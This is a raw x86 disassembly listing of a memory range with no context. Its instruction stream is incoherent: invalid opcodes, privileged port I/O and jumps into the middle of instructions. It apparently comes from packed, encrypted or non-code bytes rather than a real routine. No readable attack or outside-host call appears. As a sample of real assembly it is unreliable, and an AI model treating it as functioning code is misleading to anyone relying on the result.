  4145f4:	sbb    eax,0x74b3c849
  4145f9:	leave  
  4145fa:	push   ss
  4145fb:	cmp    eax,0xdfb13e6d
  414600:	in     eax,0xe4
  414602:	mov    dh,0xe3
  414604:	gs and eax,0xa31fba63
  41460a:	cmc    
  41460b:	jnp    0x4145ef
  41460d:	gs jge 0x414621
  414610:	mov    dl,BYTE PTR [ebx-0x5f]
  414613:	jne    0x414610
  414615:	neg    BYTE PTR [esi+0x76]
  414618:	jb     0x414671
  41461a:	sbb    DWORD PTR [ebx],0xfffffff6
  41461d:	inc    ebp
  41461e:	in     al,0x68
  414620:	pop    esi
  414621:	in     al,dx
  414622:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414623:	inc    eax
  414624:	sub    eax,DWORD PTR fs:[edi+0x31]
  414628:	adc    DWORD PTR [edi+0x26f4e799],edx
  41462e:	cli    
  41462f:	cmp    bl,cl
  414631:	test   BYTE PTR [eiz*4-0x67628426],bl
  414638:	inc    esp
  414639:	or     DWORD PTR [ebp-0x1777bc8a],edi
  41463f:	cdq    
  414640:	adc    al,0x3f
  414642:	je     0x41469e
  414644:	(bad)  
  414645:	sub    ebx,edi
  414647:	retf   
  414648:	dec    ebp
  414649:	in     al,dx
  41464a:	scas   al,BYTE PTR es:[edi]
  41464b:	pop    ss
  41464c:	mov    edi,0x3f46f902
  414651:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414652:	pop    DWORD PTR [edi+edx*2-0x4741a66c]
  414659:	mov    ds,WORD PTR ds:0x1b7d46ae
  41465f:	xchg   BYTE PTR [ebx],al
  414661:	es (bad) 
  414663:	icebp  
  414664:	push   ss
  414665:	sti    
  414666:	shl    BYTE PTR [esi],1
  414668:	xchg   esi,eax
  414669:	test   al,0x41
  41466b:	stos   DWORD PTR es:[edi],eax
  41466c:	sbb    DWORD PTR [edx+0x2b],esi
  41466f:	xchg   edi,eax
  414670:	adc    DWORD PTR [eax],ecx
  414672:	shr    DWORD PTR [edx],0x74
  414675:	mov    dh,cl
  414677:	daa    
  414678:	sub    al,0x73
  41467a:	push   edx
  41467b:	ja     0x4146f8
  41467d:	mov    al,ds:0x896bd2c5
  414682:	(bad)  
  414686:	popa   
  414687:	mov    al,ds:0x86ddaa1c
  41468c:	adc    BYTE PTR [ebx+eax*2],0x5a
  414690:	lods   eax,DWORD PTR ds:[esi]
  414691:	(bad)  
  414692:	mov    esi,0x47d5fac1
  414697:	leave  
  414698:	stos   BYTE PTR es:[edi],al
  414699:	push   ss
  41469a:	fist   DWORD PTR [ecx+0x4802e395]
  4146a0:	xchg   edi,eax
  4146a1:	sub    al,BYTE PTR [edx-0x40]
  4146a4:	and    DWORD PTR [edi-0x53cabd73],ebx
  4146aa:	mov    edx,esi
  4146ac:	and    cl,BYTE PTR [esi+edi*2-0x74]
  4146b0:	nop
  4146b1:	daa    
  4146b2:	xchg   BYTE PTR [ebp+0x22a7a2b2],ah
  4146b8:	add    ah,dh
  4146ba:	push   0x6a
  4146bc:	cs mov ah,0xa3
  4146bf:	sub    al,0x51
  4146c1:	add    DWORD PTR [esp+edi*4],ecx
  4146c4:	ret    0xb932
  4146c7:	(bad)  
  4146c8:	ret    
  4146c9:	add    BYTE PTR [eax],dh
  4146cb:	jge    0x4146da
  4146cd:	sbb    DWORD PTR [ebx+0x6d],ebx
  4146d0:	addr16 jge 0x414674
  4146d3:	pop    esp
  4146d4:	mov    cl,0x80
  4146d6:	xchg   edi,eax
  4146d7:	outs   dx,DWORD PTR ds:[esi]
  4146d8:	mov    WORD PTR [edx+0x57a9c59],gs
  4146de:	jl     0x4146d4
  4146e0:	dec    esi
  4146e1:	jmp    0x414704
  4146e3:	ins    DWORD PTR es:[edi],dx
  4146e4:	nop
  4146e5:	pushf  
  4146e6:	jecxz  0x4146ec
  4146e8:	call   0x135b:0xeefe2d5e
  4146ef:	push   ecx
  4146f0:	inc    edi
  4146f1:	das    
  4146f2:	dec    ecx
  4146f3:	cmp    esi,DWORD PTR [ebp-0x6f5c7548]
  4146f9:	add    ah,BYTE PTR [ebx]
  4146fb:	js     0x41468d
  4146fd:	(bad)  
  4146ff:	jge    0x41472c
  414701:	enter  0x4685,0xad
  414705:	das    
  414706:	lods   eax,DWORD PTR ds:[esi]
  414707:	repnz imul esp,ebp,0xffffffc1
  41470b:	and    BYTE PTR [ecx-0x31d8719f],cl
  414711:	jp     0x414711
  414713:	fs nop
  414715:	xor    bh,BYTE PTR [ecx+0x10]
  414718:	push   edx
  414719:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41471a:	mov    eax,ds:0x92b1d60f
  41471f:	out    0x27,al
  414721:	sbb    al,0xc3
  414723:	inc    ebx
  414724:	cs repnz mov ebx,0x1255d56
  41472b:	push   esp
  41472c:	retf   
  41472d:	daa    
  41472e:	sbb    eax,0xa42375b8
  414733:	or     esi,DWORD PTR [edx+0x67]
  414736:	push   ss
  414737:	sti    
  414738:	ds adc eax,0xcd67f697
  41473e:	es lock add al,0x3c
  414742:	push   ebx
  414743:	in     eax,0x69
  414745:	mov    ds:0x6e962f8a,eax
  41474a:	sub    ah,bh
  41474c:	cld    
  41474d:	jmp    0x414737
  41474f:	mov    gs,esp
  414751:	lods   al,BYTE PTR ds:[esi]
  414752:	call   0x27aa:0x2b5d31e7
  414759:	out    dx,al
  41475a:	jecxz  0x4147a6
  41475c:	xchg   eax,edx
  41475e:	(bad)  
  41475f:	(bad)  
  414760:	mov    edx,0x2bd72fee
  414765:	mov    cl,0xe7
  414767:	mov    edi,0x82462c52
  41476c:	fsubr  DWORD PTR [ebx-0x2a956f00]
  414772:	xchg   DWORD PTR [ebx],ebp
  414774:	dec    ebx
  414775:	cld    
  414776:	fisubr WORD PTR [esi]
  414778:	add    DWORD PTR [ecx+0x58863d1f],0xffffff98
  41477f:	stc    
  414780:	pop    ecx
  414781:	push   ecx
  414782:	mov    ds:0x79697df8,eax
  414787:	pop    ebp
  414788:	add    BYTE PTR ds:[esi-0x48],ah
  41478c:	sbb    al,0xfa
  41478e:	sub    DWORD PTR [esi+0x389da72e],0x80fb8e6
  414798:	int    0xa7
  41479a:	aam    0x54
  41479c:	sbb    eax,0x1e915e4b
  4147a1:	ja     0x4147c4
  4147a3:	scas   eax,DWORD PTR es:[edi]
  4147a4:	test   BYTE PTR [esi+0x28],al
  4147a7:	dec    eax
  4147a8:	in     eax,dx
  4147a9:	gs das 
  4147ab:	push   esi
  4147ac:	cli    
  4147ad:	pushf  
  4147ae:	and    esi,DWORD PTR [eax-0x59c12843]
  4147b4:	dec    ebx
  4147b5:	je     0x414829
  4147b7:	aaa    
  4147b8:	out    0xbb,al
  4147ba:	add    eax,0xc149801c
  4147bf:	jae    0x414794
  4147c1:	push   0xffffffe4
  4147c3:	pop    ecx
  4147c4:	shl    dh,1
  4147c6:	or     esp,ecx
  4147c8:	out    dx,eax
  4147c9:	ret    0x462d
  4147cc:	jecxz  0x4147ea
  4147ce:	dec    edi
  4147cf:	jmp    0x9d577249
  4147d4:	lds    ebp,FWORD PTR [esi+edx*2+0x2a]
  4147d8:	inc    edx
  4147d9:	inc    esi
  4147da:	jecxz  0x4147a1
  4147dc:	loop   0x414856
  4147de:	mov    esi,0x57476d6
  4147e3:	sub    DWORD PTR [edi+0x53a4bb02],ebp
  4147e9:	mov    ecx,0xd86e4d53
  4147ee:	out    0x2e,eax
  4147f0:	mov    cl,BYTE PTR [edx-0x1d]
  4147f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147f4:	ins    BYTE PTR es:[edi],dx
  4147f5:	iret   
  4147f6:	xor    bl,bh
  4147f8:	fsub   QWORD PTR [eax+0x51]
  4147fb:	jmp    DWORD PTR [edi-0x1b]
  4147fe:	int    0x38
  414800:	xchg   esi,esp
  414802:	and    bl,BYTE PTR [ecx-0x69b169c8]
  414808:	push   edx
  414809:	lea    ebp,[esi+0x29]
  41480c:	cdq    
  41480d:	test   eax,0xd26e852c
  414812:	jns    0x4147fd
  414814:	retf   
  414815:	or     al,0x7
  414817:	add    bl,dh
  414819:	in     eax,dx
  41481a:	das    
  41481b:	adc    cl,al
  41481d:	jo     0x4147a4
  41481f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414820:	pop    ebx
  414821:	pop    ss
  414822:	jle    0x414831
  414824:	pop    ebp
  414825:	lods   eax,DWORD PTR ds:[esi]
  414826:	or     al,0x8d
  414828:	je     0x414837
  41482a:	loopne 0x4147f1
  41482c:	test   DWORD PTR ds:0xbf4b3362,eax
  414832:	sbb    ebx,esp
  414834:	dec    esi
  414835:	sti    
  414836:	push   edx
  414837:	xchg   ebx,eax
  414838:	shl    BYTE PTR ds:0x9090fb51,0xe
  41483f:	xor    ecx,edi
  414841:	stos   BYTE PTR es:[edi],al
  414842:	pop    es
  414843:	xchg   edx,eax
  414844:	(bad)  
  414845:	push   ss
  414846:	add    bl,BYTE PTR [edx-0x22]
  414849:	jnp    0x41485f
  41484b:	jno    0x414802
  41484d:	lods   al,BYTE PTR ds:[esi]
  41484e:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414850:	fistp  QWORD PTR [eax-0x26]
  414853:	pop    es
  414854:	or     al,0xb7
  414856:	popa   
  414857:	lock mov ecx,0x17e10492
  41485d:	mov    dl,0x36
  41485f:	aas    
  414860:	loopne 0x4147fb
  414862:	popa   
  414863:	in     eax,0xb8
  414865:	repnz iret 
  414867:	fisttp DWORD PTR [edi-0x12b55833]
  41486d:	adc    al,0xc4
  414870:	mov    esi,0xf4534f03
  414875:	adc    DWORD PTR [edi+edi*2-0x38],0xffd05b02
  41487d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41487e:	enter  0x36ee,0x7d
  414882:	jp     0x4148eb
  414884:	inc    ebx
  414885:	jne    0x4148cc
  414887:	sbb    DWORD PTR [edx],0x9ed4f303
  41488d:	push   esp
  41488e:	loopne 0x41484a
  414890:	inc    eax
  414891:	adc    al,0x82
  414893:	adc    BYTE PTR [ecx],0xc5
  414896:	mov    esp,0xa078dc6f
  41489b:	cmp    eax,0x6b742934
  4148a1:	(bad)  
  4148a2:	(bad)  
  4148a3:	xchg   ebp,eax
  4148a4:	jae    0x4148dd
  4148a6:	iret   
  4148a7:	xchg   ebx,eax
  4148a8:	xor    eax,0x3f99d6a9
  4148ad:	dec    ecx
  4148ae:	stc    
  4148af:	push   0x31ac7a51
  4148b4:	out    dx,al
  4148b5:	xchg   ebx,eax
  4148b6:	leave  
  4148b7:	popf   
  4148b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148b9:	xchg   edx,eax
  4148ba:	pop    edx
  4148bb:	cli    
  4148bc:	mov    al,0xa9
  4148be:	leave  
  4148bf:	add    BYTE PTR [esi-0x7debcb74],bl
  4148c5:	loope  0x41484c
  4148c7:	rol    BYTE PTR [eax+0x6216a97],cl
  4148cd:	repnz dec ebx
  4148cf:	lock or eax,0xb17c1db
  4148d5:	pop    es
  4148d6:	fcomip st,st(1)
  4148d8:	mov    ss,WORD PTR [eax]
  4148da:	jb     0x4148f4
  4148dc:	jl     0x414894
  4148de:	loope  0x4148cb
  4148e0:	in     eax,dx
  4148e1:	in     al,dx
  4148e2:	retf   0xc09c
  4148e5:	and    al,0xbb
  4148e7:	mov    ecx,0x3390c01e
  4148ec:	lods   al,BYTE PTR ds:[esi]
  4148ed:	and    bh,BYTE PTR [esi]
  4148ef:	xchg   ebx,eax
  4148f0:	pop    esi
  4148f1:	sub    eax,0xd648756a
  4148f6:	and    BYTE PTR [ecx],dl
  4148f8:	push   ss
  4148f9:	sub    BYTE PTR [esi-0xb],0x97
  4148fd:	xlat   BYTE PTR ds:[ebx]
  4148fe:	and    al,0x30
  414900:	mov    eax,ds:0xaa5b1e24
  414905:	or     esp,DWORD PTR [edi-0x61059b64]
  41490b:	inc    ebp
  41490c:	cmovg  esi,DWORD PTR [ecx]
  41490f:	xor    cl,BYTE PTR [edi+ebp*4-0x71]
  414913:	icebp  
  414914:	xor    edx,DWORD PTR [edx]
  414916:	dec    edi
  414917:	cmp    DWORD PTR [esi+0x30e214e9],eax
  41491d:	pop    ecx
  41491e:	or     al,0xe8
  414920:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414921:	fist   DWORD PTR [ecx-0x6e]
  414924:	adc    BYTE PTR [ebx],bh
  414926:	je     0x41499d
  414928:	inc    edx
  414929:	add    esi,DWORD PTR [edx+0x64]
  41492c:	scas   eax,DWORD PTR es:[edi]
  41492d:	loope  0x41491b
  41492f:	dec    edx
  414930:	jns    0x4149a0
  414932:	data16 test BYTE PTR [edx-0x1c],dh
  414936:	cmp    eax,DWORD PTR [edi-0x3e259df4]
  41493c:	xor    eax,0xd9cc2a6c
  414941:	xchg   ebx,eax
  414942:	or     edi,0x24
  414945:	inc    esp
  414946:	cmp    BYTE PTR [eax],0xe2
  414949:	or     ah,BYTE PTR [ebp+0x2e]
  41494c:	lahf   
  41494d:	pop    ds
  41494e:	push   esi
  41494f:	push   edx
  414950:	ins    DWORD PTR es:[edi],dx
  414951:	push   0x6f3f405e
  414956:	jno    0x4149af
  414958:	call   0x23d401bc
  41495d:	sub    edx,DWORD PTR [ebx-0x1b8082b9]
  414963:	fld    TBYTE PTR [ebx]
  414965:	scas   al,BYTE PTR es:[edi]
  414966:	je     0x4149c5
  414968:	cmp    edi,DWORD PTR [ebx+0x338d103f]
  41496e:	adc    eax,0x34da561f
  414973:	ins    DWORD PTR es:[edi],dx
  414974:	sub    BYTE PTR [edx-0x71],0xff
  414978:	jne    0x41499d
  41497a:	mov    ah,0x7a
  41497c:	push   eax
  41497d:	lds    ebx,FWORD PTR [ebx-0x20]
  414980:	jbe    0x41496f
  414982:	mov    edx,0x9a90dd5e
  414987:	stos   BYTE PTR es:[edi],al
  414988:	jnp    0x4149bf
  41498a:	loopne 0x41493a
  41498c:	push   0xffffff9c
  41498e:	in     eax,dx
  41498f:	mov    ds:0xdbcbb281,al
  414994:	mov    ebx,0x8ef6b39c
  414999:	mov    al,0x4d
  41499b:	cmp    eax,DWORD PTR [ebx+0x16629f30]
  4149a1:	mov    dh,0xec
  4149a3:	sar    edx,1
  4149a5:	fistp  QWORD PTR [ebx+0x6f36e90d]
  4149ab:	mov    eax,ds:0x5330b42a
  4149b0:	icebp  
  4149b1:	add    BYTE PTR [esi],ah
  4149b3:	aas    
  4149b4:	dec    ebx
  4149b5:	mov    ecx,0x4b7c466a
  4149ba:	loopne 0x414962
  4149bc:	dec    ebp
  4149bd:	inc    eax
  4149be:	xchg   ebx,eax
  4149bf:	dec    ebp
  4149c0:	fadd   QWORD PTR [ecx]
  4149c2:	lahf   
  4149c3:	inc    esp
  4149c4:	push   ss
  4149c5:	nop
  4149c6:	rcl    DWORD PTR [ecx-0x61],cl
  4149c9:	jmp    0x48677de2
  4149ce:	icebp  
  4149cf:	and    DWORD PTR [ecx+0x1aa32d4d],ebx
  4149d5:	not    DWORD PTR [edx]
  4149d7:	call   0xf6c8:0x6aa0421d
  4149de:	loopne 0x4149c1
  4149e0:	jne    0x414a4d
  4149e2:	dec    edi
  4149e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149e4:	daa    
  4149e5:	cmp    DWORD PTR [esi],edx
  4149e7:	or     al,0x68
  4149e9:	cld    
  4149ea:	xchg   esi,eax
  4149eb:	(bad)  
  4149ec:	pop    eax
  4149ed:	pop    ebx
  4149ee:	out    dx,eax
  4149ef:	xchg   edx,eax
  4149f0:	ins    BYTE PTR es:[edi],dx
  4149f1:	add    DWORD PTR [ebx-0x46],0x33
  4149f5:	pushf  
  4149f6:	enter  0x587a,0xfd
  4149fa:	ins    BYTE PTR es:[edi],dx
  4149fb:	jl     0x4149b1
  4149fd:	jge    0x414a79
  4149ff:	das    
  414a00:	xchg   BYTE PTR [edi+0x6bc92750],ch
  414a06:	mov    WORD PTR [ecx],ss
  414a08:	out    0x5a,al
  414a0a:	aam    0xd1
  414a0c:	lahf   
  414a0d:	add    BYTE PTR [ecx+esi*2-0x1d66a762],ch
  414a14:	leave  
  414a15:	xor    DWORD PTR [ebx],eax
  414a17:	push   edx
  414a18:	in     al,0xee
  414a1a:	mov    ds:0x6f5ab586,eax
  414a1f:	adc    ebp,esp
  414a21:	jnp    0x414a00
  414a23:	leave  
  414a24:	lods   eax,DWORD PTR ds:[esi]
  414a25:	lds    eax,FWORD PTR [edi+0x7f]
  414a28:	jmp    0x2b9a:0xd678b658
  414a2f:	jb     0x414a7b
  414a31:	cs sbb al,0xe4
  414a34:	inc    ebp
  414a35:	retf   0x1c2d
  414a38:	or     edx,DWORD PTR [edx+0x5c]
  414a3b:	pop    edx
  414a3c:	jp     0x414a23
  414a3e:	call   0x58c0:0xf0bad8dc
  414a45:	mov    bl,0x97
  414a47:	bound  esp,QWORD PTR [esi-0xf]
  414a4a:	test   BYTE PTR [ebx+edx*4+0x7a48c77f],0x14
  414a52:	js     0x414ac9
  414a54:	int3   
  414a55:	stos   DWORD PTR es:[edi],eax
  414a56:	lock push es
  414a58:	or     ebx,ebp
  414a5a:	(bad)  
  414a5c:	sbb    bl,dh
  414a5e:	pop    ecx
  414a5f:	mov    BYTE PTR [esi-0x12],ch
  414a62:	stos   DWORD PTR es:[edi],eax
  414a63:	jge    0x414a44
  414a65:	pusha  
  414a66:	and    DWORD PTR [ebp-0x34f8885e],ebx
  414a6c:	lods   eax,DWORD PTR ds:[esi]
  414a6d:	mov    edi,0x336657da
  414a72:	out    0x94,al
  414a74:	inc    edx
  414a75:	dec    edi
  414a76:	out    dx,al
  414a77:	xchg   BYTE PTR [esi+0x1b],cl
  414a7a:	xchg   esi,edx
  414a7c:	dec    ecx
  414a7d:	pusha  
  414a7e:	adc    DWORD PTR [ecx+0x4f8a3419],eax
  414a84:	xchg   edi,eax
  414a85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a86:	cmp    BYTE PTR [esi+esi*8+0x6d78c7a],0x53
  414a8e:	jle    0x414a38
  414a90:	clc    
  414a91:	mov    ds:0xedcd4487,al
  414a96:	into   
  414a97:	cli    
  414a98:	sahf   
  414a99:	imul   cl
  414a9b:	scas   al,BYTE PTR es:[edi]
  414a9c:	jp     0x414abc
  414a9e:	sub    BYTE PTR ds:0xbcf7479f,bl
  414aa4:	sbb    edi,DWORD PTR [edx+0x4536572a]
  414aaa:	sahf   
  414aab:	adc    edi,DWORD PTR [ebx+0x7d]
  414aae:	shl    dh,0x1b
  414ab1:	xchg   edx,eax
  414ab2:	pop    ds
  414ab3:	mov    BYTE PTR [edx],cl
  414ab5:	and    ebx,DWORD PTR [ebx]
  414ab7:	sub    DWORD PTR [ebx+0x69],esi
  414aba:	pusha  
  414abb:	push   cs
  414abc:	lds    ebx,FWORD PTR [edi+ecx*1-0x33]
  414ac0:	sub    BYTE PTR [eax+0x59],ch
  414ac3:	jmp    0x63aa:0xa73445be
  414aca:	mov    WORD PTR [ebp+0x49],es
  414acd:	jbe    0x414a82
  414acf:	lock xlat BYTE PTR ds:[ebx]
  414ad1:	ror    DWORD PTR [esi+0x3c7c322c],1
  414ad7:	jno    0x414b28
  414ad9:	or     DWORD PTR [eax+0x5e60c6a0],0xa25a37f7
  414ae3:	mov    esi,0x2290fc15
  414ae8:	aas    
  414ae9:	mov    ch,0x33
  414aeb:	sub    BYTE PTR [esi+0xc0df69d],0xa2
  414af2:	cmp    BYTE PTR [esi-0x286dbc0f],0x4d
  414af9:	or     eax,0xbe3671ce
  414afe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414aff:	fnstsw WORD PTR [ebx+0x1998e0bc]
  414b05:	adc    ebp,DWORD PTR [ebx-0x26f2a9f3]
  414b0b:	in     al,0xcb
  414b0d:	or     ecx,DWORD PTR cs:[esi-0x50]
  414b11:	int    0xac
  414b13:	cmp    al,0x41
  414b15:	test   al,0x4c
  414b17:	adc    BYTE PTR [edi-0x61a4fa90],0x78
  414b1e:	inc    esi
  414b1f:	mov    bh,0x26
  414b21:	dec    eax
  414b22:	push   ebp
  414b23:	xchg   BYTE PTR [esi+0x5f],cl
  414b26:	sbb    ecx,DWORD PTR [eax]
  414b28:	adc    eax,0xb3b80472
  414b2d:	hlt    
  414b2e:	add    BYTE PTR [edi-0x74a7f2e1],ch
  414b34:	mov    eax,0x735cf27a
  414b39:	adc    edx,ebp
  414b3b:	mov    bh,0xc2
  414b3d:	scas   eax,DWORD PTR es:[edi]
  414b3e:	mov    ah,0x53
  414b40:	cmp    al,dh
  414b42:	in     eax,dx
  414b43:	jmp    0x47c4:0x20d4bd5e
  414b4a:	cmp    eax,0xe3d4c39e
  414b4f:	jno    0x414b93
  414b51:	adc    eax,DWORD PTR [eax+0x87d05a2]
  414b57:	in     eax,dx
  414b58:	inc    edi
  414b59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b5a:	mov    ah,0x1b
  414b5c:	(bad)  
  414b5d:	sbb    ecx,DWORD PTR [ebp+0x11f15c30]
  414b63:	push   esp
  414b64:	sub    ecx,edx
  414b66:	ins    DWORD PTR es:[edi],dx
  414b67:	(bad)  
  414b68:	dec    esi
  414b69:	in     eax,0x96
  414b6b:	xor    esi,esi
  414b6d:	adc    ch,cl
  414b6f:	int    0xc3
  414b71:	lock push ebp
  414b73:	retf   
  414b74:	jp     0x414bbb
  414b76:	jg     0x414bb9
  414b78:	int3   
  414b79:	hlt    
  414b7a:	xor    DWORD PTR [ebp+0x66],esp
  414b7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b7e:	jp     0x414b0f
  414b80:	xchg   esi,eax
  414b81:	xchg   DWORD PTR [ecx],esi
  414b83:	jle    0x414b8d
  414b85:	lods   al,BYTE PTR ds:[esi]
  414b86:	je     0x414bc0
  414b88:	adc    BYTE PTR [esi],0x66
  414b8b:	popf   
  414b8c:	call   0xa52cf2ff
  414b91:	ret    0x23a1
  414b94:	mov    ecx,0x4e28047
  414b99:	mov    edx,0x52ae7584
  414b9e:	pop    eax
  414b9f:	push   edx
  414ba0:	rcl    BYTE PTR [edi],0xd4
  414ba3:	xchg   esp,eax
  414ba4:	jno    0x414b5c
  414ba6:	inc    eax
  414ba7:	inc    ebx
  414ba8:	push   esi
  414ba9:	call   0xad91:0x578098bc
  414bb0:	xchg   esp,eax
  414bb1:	push   edi
  414bb2:	into   
  414bb3:	(bad)  
  414bb4:	pop    es
  414bb5:	sbb    al,0xdc
  414bb7:	mov    esp,0x7bb531cd
  414bbc:	test   al,0xb5
  414bbe:	push   esp
  414bbf:	pop    eax
  414bc0:	nop
  414bc1:	into   
  414bc2:	sbb    BYTE PTR [eax+0x804c279],al
  414bc8:	cmp    eax,0x934d016a
  414bcd:	or     edi,DWORD PTR [edx+0x2a]
  414bd0:	pop    es
  414bd1:	fimul  WORD PTR [esi-0x7c3394f7]
  414bd7:	in     eax,dx
  414bd8:	push   edx
  414bd9:	dec    ebx
  414bda:	inc    ebx
  414bdb:	pusha  
  414bdc:	test   BYTE PTR ds:0x564e678f,bl
  414be2:	nop
  414be3:	dec    edi
  414be4:	inc    ecx
  414be5:	jae    0x414c2a
  414be7:	jge    0x414c32
  414be9:	nop
  414bea:	xor    BYTE PTR [ebx],al
  414bec:	push   ebp
  414bed:	xor    eax,0xd6eb033f
  414bf2:	imul   edx,DWORD PTR [ebp+eax*1+0x12067775],0x4527e2f1
  414bfd:	aad    0x93
  414bff:	push   esi
  414c00:	stos   DWORD PTR es:[edi],eax
  414c01:	sbb    eax,0xcbc9aeb1
  414c06:	in     al,0x5b
  414c08:	and    dh,dl
  414c0a:	rcr    DWORD PTR [edi+0x6d58f808],0xb7
  414c11:	lea    edi,[esi]
  414c13:	je     0x414c51
  414c15:	jmp    0x9e63:0xbff85308
  414c1c:	enter  0xb59,0x80
  414c20:	call   0x43543f7e
  414c25:	and    eax,0x55515645
  414c2a:	mov    ds:0x7e4d8950,al
  414c2f:	mov    bl,BYTE PTR [ebx-0x69981aba]
  414c35:	mov    esi,0xed2a1722
  414c3a:	push   0x6b2d7fcf
  414c3f:	sub    BYTE PTR [edx-0x494809a8],bh
  414c45:	repz daa 
  414c47:	(bad)  
  414c48:	addr16 jae 0x414c69
  414c4b:	(bad)  
  414c4c:	nop
  414c4d:	hlt    
  414c4e:	pusha  
  414c4f:	out    dx,eax
  414c50:	jp     0x414c72
  414c52:	sub    eax,0xa2f21cdd
  414c57:	jmp    0xc43:0x4328c120
  414c5e:	les    ebx,FWORD PTR [edi-0x6b027331]
  414c64:	aad    0x1d
  414c66:	mov    WORD PTR [edx+0x607f9dd1],?
  414c6c:	push   ds
  414c6d:	jl     0x414c07
  414c6f:	or     DWORD PTR [esi],esp
  414c71:	jp     0x414c6f
  414c73:	mov    edx,ebp
  414c75:	xor    DWORD PTR [esp+esi*2+0x58cac7e3],eax
  414c7c:	nop
  414c7d:	shr    DWORD PTR [ebp+0x2d43ff3b],1
  414c83:	jns    0x414c69
  414c85:	jae    0x414c58
  414c87:	adc    ch,ah
  414c89:	dec    ebp
  414c8a:	adc    eax,0x72fbf1d
  414c8f:	add    eax,ecx
  414c91:	lods   eax,DWORD PTR ds:[esi]
  414c92:	jp     0x414cf2
  414c94:	mov    bh,0xee
  414c96:	push   ss
  414c97:	hlt    
  414c98:	mov    al,0x4a
  414c9a:	sbb    al,0x4a
  414c9c:	push   edx
  414c9d:	cdq    
  414c9e:	enter  0xcecb,0x23
  414ca2:	push   0x5f38ad60
  414ca7:	out    0xf,eax
  414ca9:	cmp    ebx,DWORD PTR [edi+ecx*1+0x24]
  414cad:	inc    edi
  414cae:	es push ecx
  414cb0:	iret   
  414cb1:	push   ebp
  414cb2:	in     eax,dx
  414cb3:	sub    eax,0xd45b2035
  414cb8:	xor    BYTE PTR [ecx+0x3f],cl
  414cbb:	ds jge 0x414c90
  414cbe:	pushf  
  414cbf:	cld    
  414cc0:	loopne 0x414c76
  414cc2:	push   cs
  414cc3:	cmc    
  414cc4:	push   cs
  414cc5:	nop
  414cc6:	retf   0x82eb
  414cc9:	push   ds
  414cca:	pop    esp
  414ccb:	stos   DWORD PTR es:[edi],eax
  414ccc:	inc    ecx
  414ccd:	dec    ecx
  414cce:	mov    esp,0x6eac72a7
  414cd3:	pop    ss
  414cd4:	sbb    BYTE PTR [esp+ebp*1],ch
  414cd7:	add    DWORD PTR [edx],0x50
  414cda:	mov    esi,0xbd31de00
  414cdf:	fstp   QWORD PTR [edx-0x54]
  414ce2:	test   al,0x8f
  414ce4:	pushf  
  414ce5:	repz push 0x3e6f6751
  414ceb:	push   cs
  414cec:	sbb    ebx,0x7a6834c4
  414cf2:	stos   BYTE PTR es:[edi],al
  414cf3:	cli    
  414cf4:	fs hlt 
  414cf6:	ins    BYTE PTR es:[edi],dx
  414cf7:	adc    eax,DWORD PTR [esi]
  414cf9:	shr    edx,0x1a
  414cfc:	sbb    bh,BYTE PTR [esi+0x3a]
  414cff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d00:	cmp    BYTE PTR [edx],bh
  414d02:	stc    
  414d03:	test   DWORD PTR [esi+0x6c],0x45697161
  414d0a:	ret    0x6207
  414d0d:	push   esp
  414d0e:	pop    es
  414d0f:	xchg   ebx,eax
  414d10:	(bad)  
  414d11:	mul    DWORD PTR [eax+0x4e20c590]
  414d17:	add    edx,DWORD PTR [ecx+0x40]
  414d1a:	into   
  414d1b:	ret    0xe676
  414d1e:	pusha  
  414d1f:	xlat   BYTE PTR ds:[ebx]
  414d20:	fninit 
  414d22:	adc    al,0x57
  414d24:	mov    ah,0x33
  414d26:	dec    edx
  414d27:	push   edi
  414d28:	loope  0x414d0f
  414d2a:	adc    dl,BYTE PTR [edi]
  414d2c:	sti    
  414d2d:	xor    BYTE PTR [esi-0x4],bl
  414d30:	mov    esi,0xd35e73c1
  414d35:	xlat   BYTE PTR ds:[ebx]
  414d36:	ret    
  414d37:	xchg   esi,eax
  414d38:	je     0x414db8
  414d3a:	outs   dx,BYTE PTR ds:[esi]
  414d3b:	lea    ecx,[ebx-0x7a626ef8]
  414d41:	pushf  
  414d42:	jmp    0x5e97f875
  414d47:	(bad)  [esi]
  414d49:	mov    edi,DWORD PTR [ecx+0x52]
  414d4c:	enter  0xa367,0x24
  414d50:	popa   
  414d51:	sub    dl,BYTE PTR [esi]
  414d53:	int3   
  414d54:	mov    ecx,0x39794f42
  414d59:	inc    ebp
  414d5a:	es inc edi
  414d5c:	jnp    0x414d61
  414d5e:	xor    eax,DWORD PTR [edx]
  414d60:	sbb    BYTE PTR [esi+esi*1],al
  414d63:	mov    BYTE PTR ds:0x3d683130,dh
  414d69:	xor    dl,BYTE PTR [ecx+eax*8+0x2b]
  414d6d:	cmc    
  414d6e:	push   es
  414d6f:	and    al,0x77
  414d71:	and    eax,0xc855d672
  414d76:	fstp   st(0)
  414d78:	xor    al,0xa9
  414d7a:	mov    eax,0x70da50a9
  414d7f:	test   al,0xa0
  414d81:	out    0x27,al
  414d83:	jo     0x414d71
  414d85:	(bad)  
  414d86:	xor    al,0x93
  414d88:	xchg   ebp,eax
  414d89:	dec    esi
  414d8a:	call   0x96ec:0x257e91a3
  414d91:	jmp    0x66ffdaf8
  414d96:	(bad)  
  414d97:	and    bl,ah
  414d99:	mov    ds:0xa98e18c,eax
  414d9e:	test   al,0x62
  414da0:	adc    edi,DWORD PTR [ebx-0x392fc845]
  414da6:	mov    dl,0x1b
  414da8:	sbb    al,0xea
  414daa:	cmp    al,0xdf
  414dac:	js     0x414d7f
  414dae:	sub    cl,al
  414db0:	retf   
  414db1:	push   0x5e394ea7
  414db6:	rol    DWORD PTR [ebp-0x3c],1
